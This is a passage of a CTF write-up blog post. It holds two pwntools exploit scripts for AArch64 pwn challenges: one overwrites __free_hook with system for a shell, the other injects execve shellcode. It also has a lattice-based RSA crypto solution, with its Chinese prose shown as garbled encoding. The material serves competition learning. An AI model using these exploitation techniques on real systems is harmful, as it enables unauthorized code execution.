<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding=utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
<span class="c1">#context.log_level = &#39;DEBUG&#39;</span>
<span class="s1">&#39;&#39;&#39;
</span><span class="s1">func_table:	  [0x14018 + proc_base]
</span><span class="s1">opcode_table: [0x13FE8 + proc_base]
</span><span class="s1">0x0: 0x4D-&gt;
</span><span class="s1">		   calloc(location,1);
</span><span class="s1">		   calloc(timeS,1);
</span><span class="s1">           opcode +=3;
</span><span class="s1">			
</span><span class="s1">0x1: 0x2A-&gt;add;just one times;
</span><span class="s1">           p8(index0) + p8(index1)+p16(Size); opcode+=5
</span><span class="s1">0x2: 0x2F-&gt;
</span><span class="s1">           free();
</span><span class="s1">           p8(index0) + p8(index1); opcode+=3
</span><span class="s1">0x3: 0x2B-&gt;
</span><span class="s1">           Set the Location;
</span><span class="s1">           p8(index0) + p8(index1) + p8(Location); opcode+=4
</span><span class="s1">           1 &lt; Size &lt;= 4;
</span><span class="s1">0x4: 0x2D-&gt;
</span><span class="s1">           Set the Location into 0;
</span><span class="s1">           p8(index0) + p8(index1); opcode +=3
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">0 0 0 0 0 0 0 0 0 0
</span><span class="s1">
</span><span class="s1">0x5: 0x77-&gt;
</span><span class="s1">           opcode++; Up   -&gt;2ã€3-&gt;2; or 0-&gt;1;
</span><span class="s1">0x6: 0x73-&gt;
</span><span class="s1">           opcode++; Down -&gt;2ã€3-&gt;2; or 0-&gt;1;
</span><span class="s1">0x7: 0x61-&gt;
</span><span class="s1">           opcode++; Left -&gt;2ã€3-&gt;2; or 0-&gt;1;
</span><span class="s1">0x8: 0x64-&gt;
</span><span class="s1">           opcode++; Right-&gt;2ã€3-&gt;2; or 0-&gt;1;
</span><span class="s1">0x9: 0x70-&gt;
</span><span class="s1">           show;opcode++;
</span><span class="s1">0xA: 0x00-&gt;Exit
</span><span class="s1">0xB: 0x01-&gt;default;opcode++;
</span><span class="s1">
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="c1">#p = process([&#39;qemu-aarch64&#39;,&#39;-g&#39;,&#39;5555&#39;,&#39;-L&#39;,&#39;.&#39;,&#39;./main&#39;])</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;8.140.179.11&#39;</span><span class="p">,</span><span class="mi">13422</span><span class="p">)</span>
<span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x4D\x10\x10</span><span class="s1">&#39;</span> <span class="c1">#init_All_Var</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2A\x00\x04\xF0\x04</span><span class="s1">&#39;</span> <span class="c1"># Add 0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2A\x00\x05\x10\x00</span><span class="s1">&#39;</span> <span class="c1"># Add 1</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2F\x00\x04</span><span class="s1">&#39;</span> <span class="c1">#delete 0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2A\x00\x04\xF0\x00</span><span class="s1">&#39;</span> <span class="c1"># Add 0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x70</span><span class="s1">&#39;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x73</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0xE</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x64\x61</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x36</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x64</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">6</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2B\x0E\x07\x03</span><span class="s1">&#39;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x64</span><span class="s1">&#39;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2B\x0F\x08\x03</span><span class="s1">&#39;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x73</span><span class="s1">&#39;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2A\x00\x06\x70\x00</span><span class="s1">&#39;</span> <span class="c1"># Add 2</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2A\x00\x07\x70\x03</span><span class="s1">&#39;</span> <span class="c1"># Add 3</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2F\x00\x06</span><span class="s1">&#39;</span> <span class="c1"># delete 2</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2F\x00\x04</span><span class="s1">&#39;</span> <span class="c1"># delete 0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2A\x00\x04\x70\x01</span><span class="s1">&#39;</span> <span class="c1"># Add 0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2A\x00\x06\x70\x00</span><span class="s1">&#39;</span> <span class="c1"># Add 2</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2A\x00\x08\x70\x00</span><span class="s1">&#39;</span> <span class="c1"># Add free_hook</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2F\x00\x06</span><span class="s1">&#39;</span> <span class="c1"># delete 2</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;cmd&gt; &#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;FMYY&#39;</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;FMYY&#39;</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x10</span><span class="s1">&#39;</span><span class="p">)</span> 
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;pos:0,4</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">|</span> <span class="mh">0x4000000000</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xF10</span> <span class="o">-</span> <span class="mh">0x154000</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;LIBC:</span><span class="se">\t</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;__malloc_Hook:</span><span class="se">\t</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]))</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;__free_hook:</span><span class="se">\t</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;FMYY&#39;</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;FMYY&#39;</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><h3 id="quite">quite</h3>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding=utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
<span class="s1">&#39;&#39;&#39;
</span><span class="s1">X22: 0x100000000000
</span><span class="s1">X21: OPCode_Memory
</span><span class="s1">N:0 Index:0x28;  X22 --;opcode+=1
</span><span class="s1">N:1	Index:0x29;  X22 ++;opcode+=1
</span><span class="s1">N:2	Index:0x2A; [X22]++;opcode+=1;
</span><span class="s1">N:3	Index:0x2F; [X22]--;opcode+=1;
</span><span class="s1">N:4	Index:0x40; _IO_putc(X22);opcode+=1;
</span><span class="s1">N:5	Index:0x23; _IO_getc(X22);opcode+=1;
</span><span class="s1">N:6	Index:0x5B; 
</span><span class="s1">N:7	Index:0x5D;
</span><span class="s1">N:8	Index:0x00;
</span><span class="s1">N:9	Index:0x47; Call 0x100000000000
</span><span class="s1">N:A Index:0x01; Default;
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="c1">#p = process([&#39;qemu-aarch64&#39;,&#39;-g&#39;,&#39;6666&#39;,&#39;-L&#39;,&#39;.&#39;,&#39;./main&#39;])</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;8.140.179.11&#39;</span><span class="p">,</span><span class="mi">51322</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\xE1\x45\x8C\xD2\x21\xCD\xAD\xF2\xE1\x65\xCE\xF2\x01\x0D\xE0\xF2\xE1\x8F\x1F\xF8\xE1\x03\x1F\xAA\xE2\x03\x1F\xAA\xE0\x63\x21\x8B\xA8\x1B\x80\xD2\xE1\x66\x02\xD4</span><span class="s1">&#39;</span>

<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x23\x29</span><span class="s1">&#39;</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x47</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><h2 id="crypto">Crypto</h2>
<h3 id="simultaneous">simultaneous</h3>
<p>å®¡è®¡ä»£ç ï¼Œå‘ç°xå’Œyå¤§å°å‡çº¦ä¸º381bitï¼Œzçº¦ä¸º631bitï¼Œeå’ŒNä¸º1024bitã€‚
é¦–å…ˆå‘ç°xå¾ˆå°ä¸”ä¸‰æ¬¡åŠ å¯†æ—¶æ‰€ç”¨çš„xç›¸åŒï¼Œè€Œe<em>x-y</em>N=y*(p+q+1)-z_åªæœ‰çº¦893bitï¼Œä¸eå’ŒNç›¸æ¯”éƒ½å¾ˆå°ï¼Œæ‰€ä»¥æ„é€ æ ¼å­è¿›è¡Œæ ¼åŸºè§„çº¦ï¼š
sage: A = matrix(ZZ,4,[2**512,0,0,0,e1,-n1,0,0,e2,0,-n2,0,e3,0,0,-n3])
sage: B = A.transpose()
sage: C = B.LLL()
sage: C[0]
(8866336715717388426172963523471330954077188809904909656840498650956244748060448654334827362938608283011460454932611722549140899975837332516255422319218997339352725870280417222934472617692234368327945625080892989434758573490606357931772643305970422681049000558333001728, 23565804679746565933710388872729524528226359415562140615287656018817455800535466780287799003178367701822507942125498993654311133503025992126025046704035560696109076086415547740763302445007651443569886959741145900119997240641197056821966126478523677707529102803982641184, 108960871214576793022207296445632894090843538519696872165557959140648817747262325676571075528643507778206273055515718254598755429648600953278539486434738401784633970948810856056270409547951407224850758488218814477712938397264786375512963038875176200582202541244988064762, 104724522928227808113699830194721186205703616771719604100697952234782584810976846111816114359575185225135299113577201578471709313075817367107222881505195506424821820424051124267603014862466153889752001180168723756986189763744130308518039129969039000165646079670467289202)
sage: x = C[0][0]&raquo;512
sage: x
661281602633708663826486920028427898009447098405701242291443669957936453059596989424786500921975783032016279781143
sage: isPrime(x)
1
æ„é€ å¦‚ä¸Šæ‰€è¿°çš„æ ¼å­ï¼Œå¯ä»¥ä»æ ¼åŸºè§„çº¦çš„ç»“æœä¸­å¿«é€Ÿå¾—åˆ°xã€‚
å¾—åˆ°xä¹‹åï¼Œä»ç„¶æ ¹æ®e*x-y*N=y*(p+q+1)-z_&lt;Nï¼Œå¾—åˆ°y=e*x//Nï¼Œæ‰€ä»¥ä¸‰æ¬¡çš„yéƒ½å¯ä»¥ç”¨è¿™ä¸ªç­‰å¼æ±‚å‡ºæ¥ã€‚
sage: y3 = e3*x//n3
sage: isPrime(y3)
1
sage: y2 = e2*x//n2
sage: isPrime(y2)
1
sage: y1 = e1*x//n1
sage: isPrime(y1)
1
xã€yéƒ½çŸ¥é“äº†ï¼Œæ‰€ä»¥ä½™æ•°k=y*(p+q+1)-z_ä¹Ÿå¯ä»¥ç›¸åº”åœ°æ±‚å‡º
sage: k3 = e3*x-y3*n3
sage: k2 = e2*x-y2*n2
sage: k1 = e1*x-y1*n1
åˆ†æä½™é¡¹kçš„ç»“æ„ï¼š
k = y*(p+q+1)-z_
= y*(p+q+1) - zbound - ((p + 1)*(q + 1)*y - zbound) % x
= y*(p+q+1) + int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q))) - ((p + 1)*(q + 1)*y - zbound) % x</p>
<p>åœ¨è¿™ä¸ªå¼å­ä¸­ï¼Œç¬¬ä¸‰é¡¹((p + 1)*(q + 1)<em>y - zbound) % xï¼Œæ˜¯å¯¹xå–å¾—çš„ä½™æ•°ï¼Œæ‰€ä»¥å®ƒè‚¯å®šæ˜¯ä¸€ä¸ªå°äºxçš„éè´Ÿæ•°ï¼›è€Œç¬¬äºŒé¡¹ int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q)))çš„å€¼ä¸å®æ•°((p-q) * round(n ** 0.25) * y) / (3 * (p + q))çš„å·®ä¸è¶…è¿‡å¸¸æ•°1ã€‚æ‰€ä»¥å¯ä»¥å¾—åˆ°k - y</em>(p+q+1+((p-q) * round(n ** 0.25)) / (3 * (p + q)))çš„ç»å¯¹å€¼æ˜¯ä¸ä¼šè¶…è¿‡x+yçš„ã€‚è€Œ(x+y)//yæ˜¯å¾ˆå°å¾ˆå°çš„ï¼Œæ‰€ä»¥å¯ä»¥æš‚æ—¶å¿½ç•¥ä¸è®¡ã€‚</p>
<p>æ‰€ä»¥ä»¤K = k//yï¼Œåˆ™å‡ ä¹å¯ä»¥è®¤ä¸ºK=p+q+1+((p-q) * round(n ** 0.25)) / (3 * (p + q))ã€‚
è¿™é‡Œround(n ** 0.25)å·²çŸ¥ï¼ŒæœªçŸ¥é‡åªæœ‰p-qå’Œp+qã€‚
å¯¹æ•´ä¸ªç­‰å¼è¿›è¡Œç®€å•çš„å˜å½¢åå¯ä»¥å¾—åˆ°ç”¨å«p+qçš„å¼å­è¡¨ç¤ºp-qï¼š
p - q = 3 * (p + q) * (K-1-(p+q)) / round(n ** 0.25)
è€Œæ ¹æ®å¹³æ–¹å·®å…¬å¼ï¼Œ(p+q)^2 - (p-q)^2 = 4pq = 4n
æ‰€ä»¥ä»¤p+q=sï¼Œåˆ™ä¸Šå¼å¯åŒ–ä¸ºs<em>s-int(9</em>s<em>s</em>(K-1-s)<em>(K-1-s))/(round(n^0.25))^2 = 4nã€‚
è€Œè¿™ä¸ªæ–¹ç¨‹å¯ä»¥ç”¨äºŒåˆ†æ³•æ±‚å…¶è¿‘ä¼¼æ•´æ•°è§£ï¼Œç„¶åç¨å¾®æ ¹æ®å¥‡å¶æ€§åšç‚¹ç›¸åº”çš„ä¿®æ­£ã€‚
sage: def magic(K,N):
&hellip;.:     l = 0
&hellip;.:     r = K
&hellip;.:     for i in range(515):
&hellip;.:         s = (l+r)//2
&hellip;.:         v = s</em>s-int(s<em>s</em>9*(K-1-s)*(K-1-s))//(round(N^0.25)*round(N^0.25))
&hellip;.:         if(v&lt;4*N):
&hellip;.:             l = s
&hellip;.:         else:
&hellip;.:             r = s
&hellip;.:     return r
&hellip;.:
sage: s3 = magic(K3,n3)
sage: s2 = magic(K2,n2)
sage: s1 = magic(K1,n1)
sage: s3
18459018640955512832829048105711364903415072505002892754520813962752576865824290315357137127800833228562342513337961044655924159981814783588968959511015508
sage: s2
19511198066679441661645179970610060853694402093688175864187492448475141832783517018527146512367573855149291232173039125664151037907250865382648639649226905
sage: s2 = s2+1
sage: s1
19094603811148743548404150847713419121365563250591127608146415278074868880338697379102160497997619208075125156916806494003926028149361835606603268896884014</p>
<p>ä¸‰ä¸ªp+qéƒ½æ±‚å‡ºæ¥ä¹‹åï¼Œå°±å¯ä»¥è·å–ç§é’¥dï¼Œæ­£å¸¸è§£å¯†å¾—åˆ°flagã€‚</p>
<p>sage: d1 = inverse(e1,n1+s1+1)
sage: d2 = inverse(e2,n2+s2+1)
sage: d3 = inverse(e3,n3+s3+1)
sage: def decrypt(c, d, n):
&hellip;.:     n = int(n)
&hellip;.:     size = n.bit_length() // 2
&hellip;.:
&hellip;.:     c_high, c_low = c
&hellip;.:     b = (c_low<strong>2 - c_high</strong>3) % n
&hellip;.:     EC = EllipticCurve(Zmod(n), [0, b])
&hellip;.:     m_high, m_low = (EC((c_high, c_low)) * d).xy()
&hellip;.:     m_high, m_low = int(m_high), int(m_low)
&hellip;.:
&hellip;.:     return (m_high &laquo; size) | m_low
&hellip;.:
sage: m1 = decrypt(c1,d1,n1)
sage: m2 = decrypt(c2,d2,n2)
sage: m3 = decrypt(c3,d3,n3)
sage: long_to_bytes(m0^^m1^^m2^^m3)
b&rsquo;flag{b4dd980a-cd0b-422a-bbee-e9005e1c6380}'</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a>
        
            <a href="/tags/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/">MD5å“ˆå¸Œæ³¨å…¥</a>
        
            <a href="/tags/ssrf/">SSRF</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>

    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/">
        
        
            <div class="article-image">
                
                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094236.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094236.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">çº¢æ˜è°·æ¯ Writeup by X1cT34m</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/bytectf2020%E5%A4%8D%E7%8E%B0/">
        
        
            <div class="article-image">
                
                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228105539.jpeg" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228105539.jpeg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ByteCTF2020å¤ç°</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/">
        
        

        <div class="article-details">
            <h2 class="article-title">â€œç¬¬äº”ç©ºé—´â€æ™ºèƒ½å®‰å…¨å¤§èµ›</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/p/gkctf2020%E5%A4%8D%E7%8E%B0/">
        
        

        <div class="article-details">
            <h2 class="article-title">GKCTF2020å¤ç°</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
        
        
            <div class="article-image">
                
                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">thinkphp5ä»£ç å®¡è®¡</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>


    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2019 - 
        
        2021 wh1sper
    </section>
    
    <section class="powerby">
        
            welcome to wh1sper's blog <br/>
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >
            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
